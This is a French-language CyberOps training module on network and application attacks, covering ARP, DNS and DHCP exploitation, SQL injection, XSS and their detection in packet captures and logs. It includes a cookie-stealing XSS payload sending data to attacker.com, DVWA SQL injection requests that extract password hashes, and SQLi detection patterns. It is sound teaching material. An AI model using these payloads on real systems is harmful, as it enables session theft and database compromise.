---
title: "Vulnérabilités avancées des applications réseau et analyse opérationnelle"
description: "Une exploration technique approfondie des vulnérabilités au niveau protocolaire, incluant les attaques ARP, DNS, DHCP et applicatives telles que l'injection SQL et les XSS, avec un focus sur l'analyse de paquets et les méthodologies de détection par journaux pour les professionnels CyberOps."
order: 17
---

## PRÉSENTATION DU MODULE

La sécurité d'un réseau d'entreprise moderne ne se limite pas à l'infrastructure fondamentale : elle s'étend aux protocoles et services qui facilitent les opérations quotidiennes. Un **Analyste en Cybersécurité** doit maîtriser les techniques permettant d'identifier les vulnérabilités dans les protocoles et applications réseau couramment exploités par les acteurs malveillants. Ce module propose un examen rigoureux de l'exploitation au niveau protocolaire — en particulier l'**empoisonnement du cache ARP**, le **tunneling DNS** et l'**épuisement DHCP** — ainsi que des menaces applicatives telles que l'**injection SQL (SQLi)**, le **Cross-Site Scripting (XSS)** et les **attaques HTTP**. Le programme se concentre sur l'identification de ces menaces par l'analyse de captures de paquets (PCAP) et de journaux serveur, à l'aide d'outils standards de l'industrie tels que **Wireshark**, `cat`, `more`, `less`, `tail` et `journalctl`.

---

## CONCEPTS FONDAMENTAUX ET DÉFINITIONS

### Vulnérabilités de la couche réseau

| Terme | Définition |
| :--- | :--- |
| **ARP (Address Resolution Protocol)** | Résout une **adresse IP** en **adresse MAC** physique sur un segment réseau local. |
| **ARP Gratuit (Gratuitous ARP)** | Une **réponse ARP** non sollicitée diffusée au démarrage d'un équipement ; peut être exploitée pour l'**empoisonnement du cache ARP**. |
| **Tunneling DNS** | Encode des données non-DNS (commandes C2, données exfiltrées) dans des **requêtes/réponses DNS** pour contourner les pare-feux. |
| **Épuisement DHCP (DHCP Starvation)** | Attaque par déni de service qui épuise le pool d'adresses IP DHCP en inondant le serveur de paquets DHCP Discover falsifiés. |
| **Usurpation DHCP (DHCP Spoofing)** | Un serveur DHCP malveillant fournit une configuration de passerelle/DNS erronée afin de rediriger ou d'intercepter le trafic client. |
| **Usurpation d'adresse MAC** | Modification de l'adresse MAC d'une carte réseau pour usurper l'identité d'un hôte légitime sur le réseau. |

### Vulnérabilités de la couche applicative

| Terme | Définition |
| :--- | :--- |
| **Injection SQL (SQLi)** | Instructions **SQL** malveillantes insérées dans des champs de saisie pour contourner l'authentification ou extraire le contenu d'une base de données. |
| **Cross-Site Scripting (XSS)** | Scripts malveillants injectés dans un site de confiance et exécutés dans le navigateur de la victime. |
| **Injection de code** | L'attaquant exécute des commandes au niveau du système d'exploitation via une application web insuffisamment protégée contre les entrées non validées. |
| **HTTP 302 Cushioning** | Abus des codes de redirection HTTP pour enchaîner les victimes à travers plusieurs serveurs avant d'atterrir sur une page malveillante. |
| **Domain Shadowing** | Un acteur malveillant s'empare des identifiants d'un domaine parent pour créer silencieusement des sous-domaines malveillants. |
| **iFrame malveillant** | Élément HTML `<iframe>` injecté dans une page compromise afin de charger silencieusement du contenu contrôlé par l'attaquant. |

---

## TAXONOMIE TECHNIQUE ET CLASSIFICATION

| Catégorie d'attaque | Vecteur spécifique | Composant ciblé | Impact principal | Indicateur de détection |
| :--- | :--- | :--- | :--- | :--- |
| **Couche 2 – Protocolaire** | Empoisonnement du cache ARP | Table ARP locale | Homme du milieu (MiTM) | Correspondances MAC/IP incorrectes ; IP dupliquées dans la table ARP |
| **Couche 3 – Protocolaire** | Empoisonnement du cache DNS | Cache du résolveur DNS | Redirection vers des sites malveillants | Enregistrements RR falsifiés ; IP inattendue pour un domaine de confiance |
| **Couche 3 – Protocolaire** | Tunneling DNS | Résolveur DNS / C2 | Exfiltration de données / communications C2 | Requêtes DNS anormalement longues ; fréquence élevée de requêtes |
| **Couche 3 – Protocolaire** | Amplification et réflexion DNS | Hôte cible (victime DDoS) | DoS / DDoS | Trafic UDP élevé provenant de résolveurs ouverts |
| **Couche 2 – Protocolaire** | Épuisement DHCP | Pool d'adresses IP DHCP | Déni de service | Flood de paquets DHCP Discover avec des adresses MAC aléatoires |
| **Couche 2 – Protocolaire** | Usurpation DHCP / Serveur DHCP malveillant | Clients DHCP | MiTM / Vol de données d'identification | Offre DHCP malveillante ; passerelle/DNS erronés transmis aux clients |
| **Couche 7 – Applicative** | Injection SQL | Serveur de base de données | Fuite de données / Altération / Contournement d'authentification | Mots-clés SQL (`UNION`, `OR 1=1`) dans les paramètres HTTP GET/POST |
| **Couche 7 – Applicative** | Cross-Site Scripting (XSS) | Navigateur client | Vol d'identité / Distribution de malware | Balises `<script>` dans le contenu fourni par l'utilisateur |
| **Couche 7 – Applicative** | HTTP 302 Cushioning | Navigateur / Client HTTP | Redirection vers un kit d'exploitation | Chaîne de redirections 302 dans le trafic HTTP |
| **Couche 7 – Applicative** | iFrame malveillant | Navigateur / Page web | Téléchargement furtif / Kit d'exploitation | Balises `<iframe>` cachées dans le code source ; iFrames d'un pixel |
| **Couche 7 – Applicative** | Usurpation d'e-mail / Hameçonnage | Utilisateur final | Vol d'identifiants / Malware | En-tête `From` falsifié ; noms de domaine avec homoglyphes |

---

## ANALYSE APPROFONDIE : MÉCANISMES D'ATTAQUE

### 1. Empoisonnement du cache ARP

Le protocole ARP ne dispose d'aucun mécanisme d'authentification. N'importe quel hôte d'un réseau local peut envoyer une **réponse ARP gratuite** en revendiquant la propriété de n'importe quelle adresse IP. Un acteur malveillant exploite cette faille pour se positionner en MiTM :

```
PC-A (192.168.10.10 / AA:AA:AA:AA:AA:AA)
Routeur R1 (192.168.10.1 / A1:A1:A1:A1:A1:A1)
Acteur malveillant (192.168.10.254 / EE:EE:EE:EE:EE:EE)
```

**Séquence d'attaque :**
1. L'acteur malveillant envoie une réponse ARP gratuite falsifiée : *"192.168.10.1 est à EE:EE:EE:EE:EE:EE"* → empoisonne le cache de **PC-A**.
2. L'acteur malveillant envoie une réponse ARP gratuite falsifiée : *"192.168.10.10 est à EE:EE:EE:EE:EE:EE"* → empoisonne le cache de **R1**.
3. Tout le trafic entre PC-A et la passerelle transite désormais par la machine de l'acteur malveillant.

> **Empoisonnement ARP passif** = interception silencieuse des données.  
> **Empoisonnement ARP actif** = modification des données en transit ou injection de charges utiles malveillantes.

**Outils courants :** `dsniff`, `Cain & Abel`, `ettercap`, `Yersinia`, `arpspoof`

---

### 2. Taxonomie des attaques DNS

#### Vulnérabilités des résolveurs DNS ouverts

| Type d'attaque | Mécanisme |
| :--- | :--- |
| **Empoisonnement du cache DNS** | Des réponses RR falsifiées redirigent les utilisateurs vers des serveurs malveillants |
| **Amplification et réflexion DNS** | L'attaquant usurpe l'IP de la victime ; des résolveurs ouverts l'inondent de volumineuses réponses DNS |
| **Épuisement des ressources DNS** | Attaque DoS qui sature toutes les ressources du résolveur, le forçant à redémarrer |

#### Techniques furtives DNS

| Technique | Description |
| :--- | :--- |
| **Fast Flux** | Rotation rapide des correspondances IP DNS (en quelques minutes) pour dissimuler l'infrastructure C2 d'un botnet |
| **Double IP Flux** | Rotation à la fois des correspondances nom d'hôte/IP ET des serveurs de noms faisant autorité |
| **Algorithmes de génération de domaines (DGA)** | Un malware génère aléatoirement des noms de domaine utilisés comme points de rendez-vous pour le C2 |

#### Tunneling DNS — Mécanisme détaillé

Le tunneling DNS exploite le fait que **le trafic DNS est rarement inspecté ou bloqué** en périphérie :

1. L'attaquant contrôle un serveur de noms faisant autorité pour un domaine (ex. : `attacker.com`).
2. Les données à exfiltrer sont **encodées en Base64 et découpées** en labels de requêtes DNS :  
   `dGhpcyBpcyBzZWNyZXQ.attacker.com`
3. Les requêtes traversent les résolveurs récursifs et atteignent le serveur de noms de l'attaquant.
4. L'attaquant répond avec des commandes encodées intégrées dans des enregistrements `TXT`, `CNAME`, `MX` ou `NULL`.
5. Le malware sur l'hôte infecté réassemble et exécute les commandes reçues.

**Indicateurs de détection :**
- Requêtes DNS dont le nom d'hôte dépasse **~50 caractères**
- Volume élevé de requêtes vers un **même domaine inhabituel**
- Utilisation de types d'enregistrements rares (`TXT`, `NULL`) pour des hôtes ordinaires
- Domaines signalés par **Cisco Umbrella** / flux de renseignements sur les menaces

---

### 3. Attaques DHCP

#### Épuisement DHCP vs Usurpation DHCP

```
┌─────────────────┬──────────────────────────────┬──────────────────────────────┐
│                 │ Épuisement DHCP              │ Usurpation DHCP / Serveur    │
│                 │                              │ malveillant                  │
├─────────────────┼──────────────────────────────┼──────────────────────────────┤
│ Objectif        │ Épuiser le pool IP (DoS)     │ Fournir une fausse config.   │
│ Méthode         │ Flood de DISCOVER avec MACs  │ Le serveur malveillant       │
│                 │ aléatoires                   │ répond en premier            │
│ Impact          │ Les clients légitimes n'ont  │ Mauvaise passerelle/DNS →    │
│                 │ plus d'IP                    │ MiTM                         │
│ Détection       │ Taux élevé de DHCP Discover  │ Plusieurs offres DHCP sur LAN│
└─────────────────┴──────────────────────────────┴──────────────────────────────┘
```

Un serveur DHCP malveillant peut diffuser trois types d'informations erronées :
- **Mauvaise passerelle par défaut** → tout le trafic est redirigé via l'attaquant
- **Mauvais serveur DNS** → l'utilisateur visite de faux sites contrôlés par l'attaquant
- **Adresse IP invalide** → déni de service pour ce client

---

### 4. Attaques HTTP et basées sur le web

#### Chaîne d'attaque web typique

```
1. La victime visite un site légitime compromis
2. Redirection HTTP 302 → chaîne à travers plusieurs serveurs compromis
3. Domain shadowing → redirige vers un serveur de sous-domaine compromis
4. Page d'atterrissage du kit d'exploitation → analyse les logiciels client (OS, Java, Flash, navigateur)
5. Plugin vulnérable exploité → le serveur du kit d'exploitation livre un shellcode
6. La charge utile (malware) est téléchargée et exécutée sur la machine de la victime
```

#### Codes de statut HTTP — Pertinence en sécurité

| Classe de code | Plage | Signification en sécurité |
| :--- | :--- | :--- |
| **Informationnel** | 1xx | Provisoire ; rarement observé dans les attaques |
| **Succès** | 2xx | Réponse normale ; `200 OK` confirme que les données ont été servies |
| **Redirection** | 3xx | **302 Found** exploité pour les attaques de cushioning |
| **Erreur client** | 4xx | `403 Forbidden`, `404 Not Found` ; indicateurs de balayage |
| **Erreur serveur** | 5xx | Peut indiquer une exploitation ou une mauvaise configuration |

#### iFrames malveillants

Les acteurs malveillants injectent des balises `<iframe>` cachées (souvent **1×1 pixel**) dans des pages web compromises. L'iFrame charge silencieusement du contenu depuis le serveur de l'attaquant, qui peut délivrer :
- Des **kits d'exploitation** ciblant les vulnérabilités du navigateur ou des plugins
- De la **publicité spam**
- Des **téléchargements furtifs de malware** (drive-by download)

---

### 5. Injection SQL — Étape par étape (Lab DVWA)

Basé sur l'analyse PCAP du lab MySQL (`SQLLab.pcap`, hôtes `10.0.2.4` ↔ `10.0.2.15`, durée ~8 min) :

| Étape | Ligne Wireshark | Requête injectée | Résultat |
| :--- | :--- | :--- | :--- |
| **Sonde / Tautologie** | Ligne 13 | `1' OR 1=1` (sous forme `id=1 1`) | Confirme la vulnérabilité SQLi — la BDD retourne un enregistrement |
| **Énumération BDD** | Ligne 19 | `1 OR 1=1 UNION SELECT database(),user()` | Révèle le nom de la BDD (`dvwa`) et l'utilisateur (`root@localhost`) |
| **Empreinte de version** | Ligne 22 | `1 OR 1=1 UNION SELECT null,version()` | Retourne la chaîne de version MySQL |
| **Découverte de tables** | Ligne 25 | `1 OR 1=1 UNION SELECT null,table_name FROM information_schema.tables` | Liste tous les noms de tables |
| **Collecte d'identifiants** | Ligne 28 | `1 OR 1=1 UNION SELECT user,password FROM users` | Extrait les **hachages de mots de passe MD5** de tous les utilisateurs |

**Exemple d'identifiants récoltés (hachages MD5) :**

```
admin   : 5f4dcc3b5aa765d61d8327deb882cf99  → "password"
gordonb : e99a18c428cb38d5f260853678922e03  → "abc123"
1337    : 8d3533d75ae2c3966d7e0d4fcc69216b  → "charley"
pablo   : 0d107d09f5bbe40cade3de5c71e9e9b7  → "letmein"
smithy  : 5f4dcc3b5aa765d61d8327deb882cf99  → "password"
```

> Les hachages MD5 peuvent être cassés avec des outils comme [CrackStation](https://crackstation.net) ou `hashcat`.

**Méthodologie Wireshark pour l'analyse SQLi :**

```
1. Ouvrir SQLLab.pcap dans Wireshark
2. Clic droit sur une ligne HTTP GET suspecte → "Suivre > Flux HTTP"
3. Dans la fenêtre de flux, utiliser "Rechercher" pour chercher les marqueurs d'injection (ex. : "1 1")
4. Observer les réponses du serveur en BLEU (destination → source)
5. Confirmer l'exfiltration de données dans la sortie HTML
```

**Exemple de requête HTTP GET malveillante :**
```http
GET /dvwa/vulnerabilities/sqli/?id=1+or+1%3D1+union+select+user%2Cpassword+from+users%23&Submit=Submit HTTP/1.1
Host: 10.0.2.15
```

```sql
-- SQL équivalent exécuté côté serveur :
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1 UNION SELECT user, password FROM users#';
```

---

### 6. Cross-Site Scripting (XSS)

| Type | Stockage | Déclenchement | Portée |
| :--- | :--- | :--- | :--- |
| **Stocké (Persistant)** | Permanently en base de données serveur | Tout visiteur charge la page | Tous les visiteurs futurs sont affectés |
| **Réfléchi (Non-persistant)** | Dans l'URL/lien malveillant | La victime clique sur le lien forgé | Uniquement les utilisateurs qui cliquent |

**Exemple de vecteur d'attaque :**
```html
<!-- L'attaquant publie ceci en commentaire sur un forum vulnérable : -->
<script>document.location='https://attacker.com/steal?c='+document.cookie;</script>
```

---

## ANALYSE OPÉRATIONNELLE

### 1. Investigation du trafic DNS (Lab Wireshark 17.1.7)

**Objectif :** Capturer et distinguer une résolution DNS légitime d'une activité potentiellement malveillante.

**Procédure de capture étape par étape :**

```bash
# 1. Vider le cache DNS avant la capture (Linux)
sudo systemd-resolve --flush-caches
sudo systemctl restart systemd-resolved.service

# 2. Utiliser nslookup pour générer du trafic DNS
nslookup
> www.cisco.com
> exit
```

**Flux de travail d'analyse Wireshark :**

| Étape | Action | Objectif |
| :--- | :--- | :--- |
| **Filtrer** | `udp.port == 53` | Isoler tout le trafic DNS |
| **Sélectionner la requête** | Paquet avec *"Standard query A www.cisco.com"* | Inspecter la requête de résolution sortante |
| **Déplier les couches** | Ethernet II → IPv4 → UDP → DNS | Vérifier les adresses MAC, IP et port source/destination |
| **Vérifier les indicateurs** | Indicateurs DNS → Récursion souhaitée (RD=1) | Confirme une requête récursive |
| **Sélectionner la réponse** | Paquet avec *"Standard query response A"* | Inspecter la réponse du résolveur |
| **Déplier les réponses** | Enregistrements CNAME + A | Comparer l'IP résolue avec la sortie nslookup |

**Structure d'une requête DNS normale :**

```
Port source   : éphémère (ex. : 54321)
Destination   : 53/UDP (serveur DNS)
Types d'enreg.: A (IPv4), AAAA (IPv6), CNAME (alias)
Longueur req. : généralement < 50 caractères
```

**Signaux d'alerte du tunneling DNS :**

```
- Nom d'hôte de la requête > 50–100 caractères
- Fréquence élevée de requêtes TXT ou NULL
- Entropie des sous-domaines anormalement élevée (chaînes de type Base64)
- Un seul domaine cumulant des centaines de requêtes/minute
- Cisco Umbrella / renseignement sur les menaces signalant le domaine
```

---

### 2. Injection SQL — Détection Wireshark (Lab 17.2.6)

```bash
# Filtre d'affichage Wireshark pour isoler le trafic SQLi :
http.request.method == "GET" && http contains "union"
# Ou plus large :
http.request.uri contains "select" || http.request.uri contains "union" || http.request.uri contains "1=1"
```

**Indicateurs de compromission (IoC) dans les flux HTTP :**

```
- Caractères encodés URL : %27 = ' (guillemet simple), %20 = espace, %23 = # (commentaire)
- Manipulation logique : id=1+OR+1%3D1
- Extraction UNION : UNION+SELECT+user%2Cpassword+FROM+users
- Terminaison de commentaire : --, #, /**/
```

---

### 3. Chasse aux menaces par journaux (Lab 17.2.7)

#### Outils de lecture de journaux Linux

| Outil | Exemple de commande | Comportement | Meilleur cas d'usage |
| :--- | :--- | :--- | :--- |
| `cat` | `cat /var/log/syslog.1` | Affiche l'intégralité du fichier en une fois | Petits fichiers ; inspection rapide |
| `more` | `more logstash-tutorial.log` | Page par page, uniquement vers l'avant | Fichiers de taille moyenne |
| `less` | `less logstash-tutorial.log` | Page par page, **bidirectionnel** | Grands fichiers ; préférable à `more` |
| `tail` | `tail /var/log/syslog` | Affiche les **10 dernières lignes** par défaut | Vérification rapide des événements récents |
| `tail -f` | `tail -f /var/log/nginx/access.log` | Flux **en temps réel** des nouvelles entrées | Surveillance d'incident en cours |
| `journalctl` | `journalctl -u nginx.service --since today` | Interroge le **journal systemd** (binaire) | Analyse des journaux de services systemd |

#### Options principales de `journalctl`

```bash
journalctl                          # Tous les journaux
journalctl --utc                    # Afficher les horodatages en UTC
journalctl -b                       # Journaux depuis le dernier démarrage
journalctl -u nginx.service         # Journaux d'un service spécifique
journalctl -u nginx.service --since today
journalctl -k                       # Messages du noyau uniquement
journalctl -f                       # Mode suivi (comme tail -f)
sudo journalctl                     # Sortie plus détaillée (nécessite root)
```

#### Syslog vs. Journald

| Fonctionnalité | Syslog | Journald |
| :--- | :--- | :--- |
| **Format** | Texte brut | Binaire (en ajout uniquement) |
| **Fichiers** | `/var/log/syslog`, `.1`, `.2`… | Fichiers binaires du journal |
| **Rotation** | Rotation de fichiers (syslog.1, .2…) | Rotation par taille/durée |
| **Outil de consultation** | `cat`, `grep`, `less` | `journalctl` |
| **Journalisation distante** | Native (protocole syslog) | Nécessite une configuration supplémentaire |
| **Données structurées** | Limitées | Support natif |
| **Importance de la synchronisation horaire** | Critique pour la corrélation de journaux | Critique pour la corrélation de journaux |

#### Format des journaux d'accès Apache/Nginx

```
218.30.103.62 - - [04/Jan/2015:05:29:26 +0000] "GET /blog/geekery/jquery.html HTTP/1.1" 200 202 "-" "Sogou web spider/4.0"
│               │   │                          │      │    │   │    │
│               │   │                          │      │    │   │    └─ Agent utilisateur
│               │   │                          │      │    │   └─ Référent
│               │   │                          │      │    └─ Taille de la réponse (octets)
│               │   │                          │      └─ Code de statut HTTP
│               │   │                          └─ Ligne de requête
│               │   └─ Horodatage
│               └─ Utilisateur authentifié (- = aucun)
└─ IP client
```

**Patterns suspects à rechercher dans les journaux web :**
```bash
# Détecter des tentatives d'injection SQL dans les journaux d'accès
grep -E "(union|select|insert|drop|1=1|'--)" /var/log/nginx/access.log

# Trouver les erreurs 4xx excessives (balayage/reconnaissance)
awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn

# Identifier les agents utilisateur inhabituels
awk -F'"' '{print $6}' /var/log/nginx/access.log | sort | uniq -c | sort -rn
```

---

## ÉTUDES DE CAS ET POINTS CLÉ D'EXAMEN

### Étude de cas 1 : Usurpation de la passerelle par défaut (ARP)

Un acteur malveillant utilise des **réponses ARP gratuites** pour associer son adresse MAC (`EE:EE:EE:EE:EE:EE`) à l'IP de la passerelle par défaut (`192.168.10.1`). Le PC-A victime et le routeur R1 mettent tous deux à jour leur cache ARP. Tout le trafic quittant le réseau local transite désormais par la machine de l'acteur malveillant, permettant une **écoute passive** ou une **injection active**.

### Étude de cas 2 : Injection SQL progressive (DVWA)

L'attaquant commence par une **sonde par tautologie** (`1 OR 1=1`), confirme la vulnérabilité, puis escalade via des instructions `UNION SELECT` pour énumérer le nom de la base de données, la version, les tables, les noms de colonnes, et extrait enfin les **hachages MD5 de mots de passe** de la table `users` — le tout en 8 minutes, visible dans un seul fichier PCAP.

### Étude de cas 3 : Tunneling DNS en entreprise

Un hôte infecté sur un réseau d'entreprise ne peut pas communiquer directement avec son serveur C2 en raison des règles de pare-feu. Il encode les réponses aux commandes sous forme de sous-domaines Base64 (ex. : `dGVzdA==.c2.attacker.com`) et les interroge via DNS. Comme le port 53/UDP est rarement bloqué en sortie, les données s'exfiltrent sans être détectées jusqu'à ce qu'une solution de sécurité DNS comme **Cisco Umbrella** signale les patterns de requêtes anormaux.

---

## DISTINCTIONS PRÉCISES POUR L'EXAMEN

| Paire | Attaque A | Attaque B | Différenciateur clé |
| :--- | :--- | :--- | :--- |
| **Tunneling DNS vs. Réflexion DNS** | Tunneling : canal C2/exfiltration covert | Réflexion : flood DDoS amplifié via résolveurs ouverts | Tunneling = communication ; Réflexion = attaque volumétrique |
| **SQLi vs. XSS** | SQLi : cible la **base de données côté serveur** | XSS : cible le **navigateur côté client** | Contexte d'exécution serveur vs. client |
| **Épuisement DHCP vs. DHCP malveillant** | Épuisement : DoS qui vide le pool IP | DHCP malveillant : MiTM via fausse passerelle/DNS | Résultat DoS vs. MiTM |
| **XSS Stocké vs. XSS Réfléchi** | Stocké : permanent en serveur, affecte tous les visiteurs | Réfléchi : dans l'URL, nécessite un clic de la victime | Portée de la persistance |
| **Empoisonnement ARP Passif vs. Actif** | Passif : capture silencieuse du trafic | Actif : modification ou injection de données malveillantes en transit | Lecture seule vs. manipulation de données |
| **HTTP 302 Cushioning vs. Domain Shadowing** | 302 Cushioning : chaîne de redirections vers un kit d'exploitation | Domain shadowing : sous-domaines détournés comme cibles de redirection | Technique de transport vs. infrastructure |

---

## RÉSUMÉ DES CONTRE-MESURES

| Menace | Mesure d'atténuation |
| :--- | :--- |
| Empoisonnement du cache ARP | Inspection ARP dynamique (DAI) sur les commutateurs gérés ; entrées ARP statiques pour les hôtes critiques |
| Tunneling / Attaques DNS | Cisco Umbrella ; inspection du trafic DNS ; blocage des services DNS dynamiques |
| Épuisement / Usurpation DHCP | DHCP Snooping sur les commutateurs ; sécurité des ports limitant le nombre d'adresses MAC par port |
| Injection SQL | Requêtes paramétrées / instructions préparées ; validation stricte des entrées ; WAF |
| XSS | En-têtes Content Security Policy (CSP) ; assainissement des entrées ; encodage des sorties |
| iFrames malveillants | Éviter les iFrames dans les applications web ; en-tête `X-Frame-Options` ; Cisco Umbrella |
| HTTP 302 Cushioning | Filtrage par proxy web ; Cisco Umbrella ; sensibilisation des utilisateurs à la sécurité |
| Menaces par e-mail | Cisco Email Security Appliance ; SPF/DKIM/DMARC ; formation des utilisateurs |
| Intégrité des journaux | Serveur syslog centralisé ; synchronisation horaire NTP ; détection de falsification des journaux |
